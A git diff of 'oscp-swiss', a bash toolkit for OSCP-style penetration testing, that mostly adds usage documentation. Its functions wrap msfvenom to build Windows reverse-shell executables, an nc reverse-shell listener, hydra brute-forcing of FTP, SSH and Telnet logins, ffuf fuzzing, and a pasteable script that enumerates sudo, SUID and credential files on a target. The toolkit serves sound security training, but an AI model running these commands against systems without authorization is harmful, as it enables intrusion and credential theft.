@@ -9,7 +9,7 @@ load_private_scripts
 
 # Description: List all functions, aliases, and variables
 # Usage: swiss
-function swiss() {   
+function swiss() {
     local swiss_path="$HOME/oscp-swiss/script/oscp-swiss.sh"
     local alias_path="$HOME/oscp-swiss/script/alias.sh"
     local extension_path="$HOME/oscp-swiss/script/extension.sh"
@@ -335,12 +335,22 @@ function swiss_ship() {
     fi
 }
 
-# TODO: Finish doc
-function swiss_windows_nc() {
+# Description:
+#   One-liner to start a reverse shell listener,
+#   warpped with rlwrap to make the reverse shell interactive
+# Usage: listen <port>
+function listen() {
     rlwrap nc -lvnp $1
 }
 
-# TODO: Finish doc
+# Description: Generate a reverse shell using msfvenom
+# Usage: swiss_windows_rev <-p PORT> <-a x86|x64|dll> [-i IP]
+# Arguments:
+#   -p|--port: Port number for the reverse shell
+#   -a|--arch: Architecture for the reverse shell (x86, x64, dll)
+#   -i|--ip: IP address for the reverse shell
+# Example:
+#  swiss_windows_rev -p 4444 -a x86 -i
 function swiss_windows_rev() {
     logger info "[i] generating windows rev exe using msfvenom"
 
@@ -370,14 +380,12 @@ function swiss_windows_rev() {
         esac
     done
 
-    # Check if the required arguments (port and arch) are provided
     if [[ -z "$port" || -z "$arch" ]]; then
         logger error "[i] Port and architecture must be specified"
         logger info "[i] usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
         return 1
     fi
 
-    # Generate reverse shell based on architecture
     case $arch in
         x86)
             msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86.exe
@@ -395,14 +403,21 @@ function swiss_windows_rev() {
     esac
 }
 
-# TODO: Finish doc
+# Description: default directory fuzzing using fuff, compatible with original arguments
+# Usage: ffuf_default [URL/FUZZ] (options)
+# Example: ffuf_default http://example.com/FUZZ -fc 400
 function ffuf_default() {
-    if [ $# -eq 0 ]; then
-        logger info "[i] Usage: ffuf_default [URL/FUZZ] (options)"
-    else
-        logger warn "[i] Recursive with depth = 2 by default"
-        local url="$1"
 
+    _helper() {
+        logger info "[i] Usage: ffuf_default [URL/FUZZ] (options)"
+        logger warn "[i] Recursive with depth = $FFUF_RECURSIVE_DEPTH"
+        logger warn "[i] Default wordlist: $FFUF_DEFAULT_WORDLIST"
+    }
+
+    if [ $# -eq 0 ]; then
+        _helper
+    else
+        local url="$1"
         if [[ "$url" =~ ^https?:// ]]; then
             # If the URL includes a protocol, extract the part after '://'
             local domain=$(echo "$url" | awk -F/ '{print $3}')
@@ -410,12 +425,10 @@ function ffuf_default() {
             # If the URL does not include a protocol, treat the first part as the domain/IP
             local domain=$(echo "$url" | awk -F/ '{print $1}')
         fi
-        
         local domain_dir="$(pwd)/ffuf/$domain"
-
         logger info "[i] Creating directory $domain_dir ..."
         mkdir -p "$domain_dir"
-        ffuf -w $wordlist_ffuf_default -recursion -recursion-depth 2 -u ${@} | tee "$domain_dir/wordlist-ffuf-default"
+        ffuf -w $FFUF_DEFAULT_WORDLIST -recursion -recursion-depth $FFUF_RECURSIVE_DEPTH -u ${@} | tee "$domain_dir/wordlist-ffuf-default"
     fi
 }
 
@@ -468,20 +481,17 @@ function gobuster_vhost_default() {
     fi
 }
 
-# TODO: Finish doc
+# Description: hydra default
 function hydra_default() {
     local IP=$1
     local PORTS=$2
-    
-    # Check if username.txt exists
+
     if [ ! -f "username.txt" ]; then
         logger error "[E] username.txt not found in the current directory."
         return 1
     fi
-    
-    # Iterate over the provided ports
+
     for PORT in $(echo $PORTS | tr "," "\n"); do
-        # Determine the service based on the port and run the appropriate hydra command
         case $PORT in
             21)
                 logger info "[I] Running hydra for FTP on port $PORT..."
@@ -494,14 +504,6 @@ function hydra_default() {
             23)
                 logger info "[I] Running hydra for Telnet on port $PORT..."
                 hydra -L username.txt -e nsr -s $PORT telnet://$IP
-                ;;
-            80)
-                logger info "[I] Running hydra for HTTP on port $PORT..."
-                hydra -L username.txt -e nsr -s $PORT http://$IP
-                ;;
-            443)
-                echo "[I] Running hydra for HTTPS on port $PORT..."
-                hydra -L username.txt -e nsr -s $PORT https://$IP
                 ;;
             *)
                 echo "Port $PORT not recognized or not supported for brute-forcing by this script."
@@ -545,39 +547,9 @@ function cp_dir() {
     fi
 }
 
-# Function to copy the IPv4 address of a specified network interface to the clipboard
-# TODO: Finish doc
-function cp_ip() {
-    logger info "[i] Usage: cp_ip <interface>"
-
-    local interface="$1"
-
-    # Check if an interface was provided as an argument
-    if [ -z "$1" ]; then
-        logger warn "[i] interface not found. Use default interface <$DEFAULT_NETWORK_INTERFACE>"
-        interface="$DEFAULT_NETWORK_INTERFACE"
-    fi
-
-    # Retrieve the IPv4 address of the specified interface
-    local ip_address
-    ip_address=$(ip -4 addr show "$interface" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
-
-    # Check if an IP address was found
-    if [ -z "$ip_address" ]; then
-        logger error "No IPv4 address found for interface $interface."
-        return 1
-    fi
-
-    # Copy the IP address to the clipboard using xclip
-    echo -n "$ip_address" | xclip -selection clipboard
-
-    # Provide feedback to the user
-    logger info "IPv4 address $ip_address of interface $interface copied to clipboard."
-}
-
-# get all urls from a web page
-# TODO: Finish doc
-function gen_pagelink() {
+# Description: get all urls from a web page
+# Usage: get_pagelink <url>
+function get_pagelink() {
     logger info "[i] start extracting all urls from $1"
     logger info "[i] original files will be stored at $PWD/links.txt"
     logger info "[i] unique links (remove duplicated) will be stored at $PWD/links-uniq.txt"
@@ -586,25 +558,24 @@ function gen_pagelink() {
     cat ./links-uniq.txt
 }
 
-# get keydords
-# TODO: Finish doc
+# Description: get keywords from a web page
+# Usage: gen_keywords <url>
 function gen_keywords() {
-    logger info "[i] usage: gen_keywords $url"
-    cewl -d 2 -m 4 -w cewl-wordlist.txt $1
+    logger info "[i] Usage: gen_keywords <url>"
+    cewl -d $CEWL_DEPTH -m $CEWL_MIN_WORD_LENGTH -w cewl-wordlist.txt $1
 }
 
-# Description: set the target IP address
+# Description: set the target IP address and set variable target
+# Usage: set_target <ip>
 function set_target() {
     s target $1
     target=$1
 }
 
-# TODO: Finish doc
+# Description: get the target IP address and copy it to the clipboard.
+# Usage: get_target
 function get_target() {
-    # Use the 'g' function to get the target value from the config file
     target=$(g target)
-
-    # Check if the 'g' function returned '-1', indicating the target is not set
     if [[ "$target" == "-1" ]]; then
         logger error "Target not found."
     elif [[ "$target" == "-2" ]]; then
@@ -615,36 +586,76 @@ function get_target() {
     fi
 }
 
-# copy a linpeas-like script to speed up the enumeration
-# TODO: Finish doc
+# Description:
+#   Copy a linpeas-like script to the clickboard. You can paste it to the target machine (Linux) directly without any file transfer effort.
+#   This is helpful to help you to enumerate the target machine.
+#   Once you paste the script to the target machine, you can run the command `check` to enumerate:
+# Usage (On the target machine): 
+#   Usage: check <option>
+# Arguments (option):
+#   - 1|user|u: check user information
+#   - 2|su: check sudo permission
+#   - 3|suid: check suid permission
+#   - 4|cred-file: check common credential files (i.e., /etc/passwd, /etc/group)
+#   - 5|exec|executable: listing executable files
+#   - 6|dir|directory: listing interesting directories (e.g., /tmp, /opt)
+#   - 7|os: check OS information
+#   - 8|ps|proc|process: check running processes
+#   - 9|cron|crontab: check cron jobs
+#   - 10|net|network: check network information
+#   - 11|dir-filename: find interesting filename recursively under the current directory
+#   - 12|dir-file: find the interesting file content recursively under the current directory
+#   - 13|search-filename <keyword>: search filename with keyword under the current directory
+#   - 14|search-file <keyword>: search file content with keyword under the current directory
+#   - 15|env: check environment variables
+# Example:
+#   $ check user             # list user information
+#   $ check 3                # list suid permission
+#   $ check 14 funny-content # search file content with 'funny-content' under the current directory
 function cp_target_script() {
     logger info "[i] Usage: cp_target_script"
     local shell_path="$HOME/oscp-swiss/script/target-enum-script.sh"
-    local new_file_path="/tmp/$(generate_random_filename).sh"
+    local new_file_path="$mktemp.sh"
     _cat $shell_path > $new_file_path
     echo "" >> $new_file_path
     echo "host='$(get_default_network_interface_ip)'" >> $new_file_path
-
+    echo "clear" >> $new_file_path
     _cat $new_file_path | xclip -selection clipboard
     rm $new_file_path
 }
 
-# tcpdump from an ip address
-# TODO: Finish doc
+# Description: tcpdump traffic from an IP address
+# Usage: listen_target <ip> [-i <interface> | --interface <interface>]
+# Arguments:
+#  <ip>: IP address to listen to
+#  -i, --interface: Network interface to listen on (default: tun0)
+# Example:
+#   listen_target 192.168.1.2 # listen on traffic from/to 192.168.1.2 on the default network interface
 function listen_target() {
-    logger info "[i] tcpdump to listen anything from an ip address\n"
-    logger info "[i] Usage: listen <ip> [-i]"
+    logger info "[i] tcpdump to listen on traffic from/to an IP address"
+    logger info "[i] Usage: listen_target <ip> [-i <interface> | --interface <interface>]"
 
-    local ip=$1
+    local interface="${DEFAULT_NETWORK_INTERFACE:-tun0}"
+    local ip=""
 
-    # Check if the interface is provided, otherwise use default 'tun0'
-    if [ "$2" == "-i" ] && [ -n "$3" ]; then
-        interface=$3
-    else
-        interface=$DEFAULT_NETWORK_INTERFACE
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            -i|--interface)
+                interface="$2"
+                shift 2
+                ;;
+            *)
+                ip="$1"
+                shift
+                ;;
+        esac
+    done
+
+    if [[ -z "$ip" ]]; then
+        logger error "[!] IP address is required"
+        return 1
     fi
 
-    # Run tcpdump with the specified interface and IP address
     sudo tcpdump -i "$interface" dst "$ip" or src "$ip"
 }
 
@@ -695,6 +706,11 @@ function go_workspace() {
     cd $(g workspace)
 }
 
+# Description:
+#   Spawn the new session in the workspace, and set target into the variables.
+#   The  function is configured by the environment variable SPAWN_SESSION_IN_WORKSPACE
+#   See settings.json for more details.
+# Usage: spawn_session_in_workspace
 function spawn_session_in_workspace() {
     if [ "$SPAWN_SESSION_IN_WORKSPACE" = true ]; then
         go_workspace
@@ -725,30 +741,39 @@ function merge() {
     logger info "[i] $output_file created successfully."
 }
 
-# get all files from ftp
-# TODO: Finish doc
+# Description: retrieve all files from a ftp server
+# Usage: get_ftp_all_files <ipaddress> [username] [password]
+# Arguments:
+#   - ipaddress: IP address of the FTP server
+#   - username: FTP username (default: anonymous)
+#   - password: FTP password (default: anonymous)
+# Example: get_ftp_all_files 192.168.1.1
 function get_ftp_all_files() {
-    # Assigning parameters to variables
-    local USERNAME=$1
-    local PASSWORD=$2
-    local IP=$3
+    local IP=$1
+    local USERNAME=${2:-"anonymous"}
+    local PASSWORD=${3:-"anonymous"}
 
-    # Check if all parameters are provided
-    if [ -z "$USERNAME" ] || [ -z "$PASSWORD" ] || [ -z "$IP" ]; then
-        echo "Usage: get_ftp_all <username> <password> <ipaddress>"
+    _helper() {
+        echo "Usage: get_ftp_all_files <ipaddress> [username] [password]"
+        return 1
+    }
+
+    if [ -z "$IP" ]; then
+        _helper
         return 1
     fi
 
-    # Run wget command with the provided parameters
     wget -r --no-passive --no-parent ftp://$USERNAME:$PASSWORD@$IP
 }
 
-# TODO: Finish doc
+# Description: lookup an IP address's public information
+# Usage: target_ipinfo <ip>
 function target_ipinfo() {
   curl https://ipinfo.io/$1/json
 }
 
-# TODO: Finish doc
+# Description: lookup the public IP address of the host
+# Usage: host_public_ip
 function host_public_ip() {
   curl ipinfo.io/ip
 }
@@ -790,6 +815,5 @@ function explain() {
         echo "No description file found for $target."
     fi
 }
-
 
 spawn_session_in_workspace
